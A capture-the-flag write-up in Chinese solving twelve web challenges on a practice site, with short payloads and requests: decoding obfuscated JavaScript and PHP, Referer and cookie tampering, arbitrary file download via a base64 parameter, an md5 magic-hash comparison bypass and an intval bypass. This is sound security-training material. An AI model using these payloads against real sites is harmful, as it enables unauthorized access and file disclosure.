# Web

*	[AAencode (100)](#AAencode)
*	[php decode (100)](#php_decode)
*	[簽到 2 (50)](#簽到2)
*	[這題不是 Web (100)](#這題不是Web)
*	[單身二十年 (100)](#單身二十年)
*	[你從哪裡來 (100)](#你從哪裡來)
*	[層層地進 (100)](#層層地進)
*	[單身一百年也沒用 (150)](#單身一百年也沒用)
*	[Download~! (200)](#Download~!)
*	[md5 collision (50)](#md5_collision)
*	[COOKIE (200)](#COOKIE)
*	[MYSQL (200)](#MYSQL)


<h2 id="AAencode">AAencode (100)</h2>

AAencode 是把 JavaScript 加密成表情符號的加密法

題目

```
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
```

decode >> alert("Hello, JavaScript")

在 chrome console 送，就會直接跑出那個對話框

直接把整串亂七八糟的符號送出去，得到 flag

<h2 id="php_decode">php decode (100)</h2>

```php
<?php
function CLsI($ZzvSWE) {
    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));
    for ($i = 0; $i < strlen($ZzvSWE); $i++) {
        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);
    }
    return $ZzvSWE;
}eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));?>
```

改成

```php
<?php
function CLsI($ZzvSWE) {
    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));
    for ($i = 0; $i < strlen($ZzvSWE); $i++) {
        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);
    }
    return $ZzvSWE;
}
echo CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==");
?>
```

得到
`phpinfo(); flag:nctf{gzip_base64_hhhhhh}`


<h2 id="簽到2">簽到 2 (50)</h2>

```html
<form action="./index.php" method="post">
	<p>输入框：<input type="password" value="" name="text1" maxlength="10"><br>
	请输入口令：zhimakaimen
	<input type="submit" value="开门">
</form>
```

長度限制 10，`zhimakaimen`長度 11

firefox - HackBar - Enable Post data

`text1=zhimakaimen`

`nctf{follow_me_to_exploit}`

<h2 id="這題不是Web">這題不是 Web (100)</h2>

> 2.gif

用 .txt 開啟

`nctf{photo_can_also_hid3_msg}`


<h2 id="單身二十年">單身二十年 (100)</h2>

用 burp 看到 (chrome 的 network 也可以看到)

> GET /web8/no_key_is_here_forever.php HTTP/1.1
> 
> Host: chinalover.sinaapp.com
> 
> User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
> 
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
> 
> Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
> 
> Accept-Encoding: gzip, deflate
> 
> Referer: http://chinalover.sinaapp.com/web8/search_key.php
> 
> Connection: close

Action -> Sent to Repeater 改成

> GET /web8/search_key.php HTTP/1.1

送回去

Response

```php
<script>window.location="./no_key_is_here_forever.php"; </script>
key is : nctf{yougotit_script_now}
```

<h2 id="你從哪裡來">你從哪裡來 (100)</h2>

HTTP Header 有一個叫 Referer

> Referer：表示瀏覽器所存取的前一個頁面，正是那個頁面上的某個連結將瀏覽器帶到了當前所請求的這個頁面。

用 burp 補上

```
Referer: google.com
```

`flag:nctf{http_referer}`


<h2 id="層層地進">層層地進 (100)</h2>

偷看別人的 writeups 才知道要訪問 http://chinalover.sinaapp.com/web3/404.html

原始碼中間有一段

```php
<!-- Placed at the end of the document so the pages load faster -->
<!--  
<script src="./js/jquery-n.7.2.min.js"></script>
<script src="./js/jquery-c.7.2.min.js"></script>
<script src="./js/jquery-t.7.2.min.js"></script>
<script src="./js/jquery-f.7.2.min.js"></script>
<script src="./js/jquery-{.7.2.min.js"></script>
<script src="./js/jquery-t.7.2.min.js"></script>
<script src="./js/jquery-h.7.2.min.js"></script>
<script src="./js/jquery-i.7.2.min.js"></script>
<script src="./js/jquery-s.7.2.min.js"></script>
<script src="./js/jquery-_.7.2.min.js"></script>
<script src="./js/jquery-i.7.2.min.js"></script>
<script src="./js/jquery-s.7.2.min.js"></script>
<script src="./js/jquery-_.7.2.min.js"></script>
<script src="./js/jquery-a.7.2.min.js"></script>
<script src="./js/jquery-_.7.2.min.js"></script>
<script src="./js/jquery-f.7.2.min.js"></script>
<script src="./js/jquery-l.7.2.min.js"></script>
<script src="./js/jquery-4.7.2.min.js"></script>
<script src="./js/jquery-g.7.2.min.js"></script>
<script src="./js/jquery-}.7.2.min.js"></script>
-->
```

還是不知為何要訪問 `/404.html`

`nctf{this_is_a_fl4g}`


<h2 id="單身一百年也沒用">單身一百年也沒用 (150)</h2>

chrome - Network

有個被重新導向的 index.php

他的 Response Header `flag:nctf{this_is_302_redirect}`


<h2 id="Download~!">Download~! (200)</h2>

提示說想下啥就下啥，但別下載音樂...

注意到兩首歌的 url

```
download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=
download.php?url=YnV4aWFuZ3poYW5nZGEubXAz
```
把兩串都拿去 base64 decode，發現都是該檔檔名

xingxingdiandeng.mp3

buxiangzhangda.mp3

也就是說把想下載的檔名拿去 base64 encode 就可以下載了

直接在網頁上訪問 download.php

```
?Access Forbidden!
```

只好把他下載下來

```
base64('download.php') = ZG93bmxvYWQucGhw
download.php?url=ZG93bmxvYWQucGhw
```

download.php

```php
??<?php
error_reporting(0);
include("hereiskey.php");
$url=base64_decode($_GET[url]);
if( $url=="hereiskey.php" || $url=="buxiangzhangda.mp3" || $url=="xingxingdiandeng.mp3" || $url=="download.php"){
	$file_size = filesize($url);
	header ( "Pragma: public" );
	header ( "Cache-Control: must-revalidate, post-check=0, pre-check=0" );
	header ( "Cache-Control: private", false );
	header ( "Content-Transfer-Encoding: binary" );
	header ( "Content-Type:audio/mpeg MP3");
	header ( "Content-Length: " . $file_size);
	header ( "Content-Disposition: attachment; filename=".$url);
	echo(file_get_contents($url));
	exit;
}
else {
	echo "Access Forbidden!";
}
?>
```

有個檔案叫 `hereiskey.php`，下載他

```php
?<?php
//flag:nctf{download_any_file_666}
?>
```

<h2 id="md5_collision">md5 collision (50)</h2>

```php
<?php
$md51 = md5('QNKCDZO');
$a = @$_GET['a'];
$md52 = @md5($a);
if(isset($a)){
if ($a != 'QNKCDZO' && $md51 == $md52) {
    echo "nctf{*****************}";
} else {
    echo "false!!!";
}}
else{echo "please input a";}
?>
```

```
md5('QNKCDZO') = 0e830400451993494058024219903391
```

`==` 是弱比較

只要做完 md5 後數值是 `0e` 開頭就會判斷通過 (科學記號的關係)

找一個做完 md5 後開頭是 0e 的值 `s1091221200a`

```
?a=s1091221200a
```

`nctf{md5_collision_is_easy}`

<h2 id="COOKIE">COOKIE (200)</h2>

TIP: 0 == not

> GET /web10/index.php HTTP/1.1
> Host: chinalover.sinaapp.com
> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:48.0) Gecko/20100101 Firefox/48.0
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
> Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
> Accept-Encoding: gzip, deflate
> Referer: http://ctf.nuptsast.com/challenges
> Cookie: Login=0
> Connection: close
> Upgrade-Insecure-Requests: 1

所以 1 == yes 

```
Cookie: Login=1
```

送回去

```
flag:nctf{cookie_is_different_from_session}
```

<h2 id="MYSQL">MYSQL (200)</h2>

```
/robots.txt
```

> robots.txt
> 存放於網站根目錄下的 ASCII 編碼文字檔案，通常會告訴網路爬蟲，哪些內容是可以被取得的，哪些是不可以取得的。

```php
别太开心，flag不在这，这个文件的用途你看完了？
在CTF比赛中，这个文件往往存放着提示信息

TIP:sql.php

<?php
if($_GET[id]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
  if ($_GET[id]==1024) {
      echo "<p>no! try again</p>";
  }
  else{
    echo($query[content]);
  }
}
?>
```

> intval(): 取得變量的整數值（不能用於 array 或 object）

```
http://chinalover.sinaapp.com/web11/sql.php?id=1023
```
no msg in 1023~~~

```
http://chinalover.sinaapp.com/web11/sql.php?id=1024
```
no! try again

```
http://chinalover.sinaapp.com/web11/sql.php?id=1024.5
```

`the flag is:nctf{query_in_mysql}`